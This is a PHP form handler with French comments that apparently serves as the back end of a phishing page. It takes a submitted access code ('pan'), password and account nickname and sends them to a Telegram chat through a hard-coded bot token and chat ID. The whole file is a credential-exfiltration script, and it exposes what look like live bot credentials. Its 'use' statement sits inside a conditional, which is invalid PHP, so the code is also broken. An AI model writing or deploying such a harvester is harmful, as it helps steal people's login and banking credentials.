<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $accessCode = $_POST["pan"];
    $password = $_POST["password"];
    $rememberMe = isset($_POST["remember-login-credentials"]) ? "Yes" : "No";
    $accountNickname = isset($_POST["account-nickname"]) ? $_POST["account-nickname"] : "";

    // Créer une chaîne avec les données à afficher
    $message = "Voici ce que vous avez saisi :\nAccess Code: $accessCode\nPassword: $password\nRemember Me: $rememberMe\nAccount Nickname: $accountNickname";

    // Remplacez ces valeurs par votre token d'accès et votre chat ID
    $telegramToken = "6483777387:AAENUPMe3aID3sADxH1GqY71qOehuR08xao";
    $chatId = "6242884372";

    // Utilisez la bibliothèque Telegram Bot API PHP pour envoyer le message
    require 'vendor/autoload.php';
    use Telegram\Bot\Api;

    $telegram = new Api($telegramToken);
    $response = $telegram->sendMessage([
        'chat_id' => $chatId,
        'text' => $message,
    ]);

    // Affiche un message sur la page pour indiquer que le message a été envoyé
    echo "<p>Message envoyé sur Telegram !</p>";
}
?>
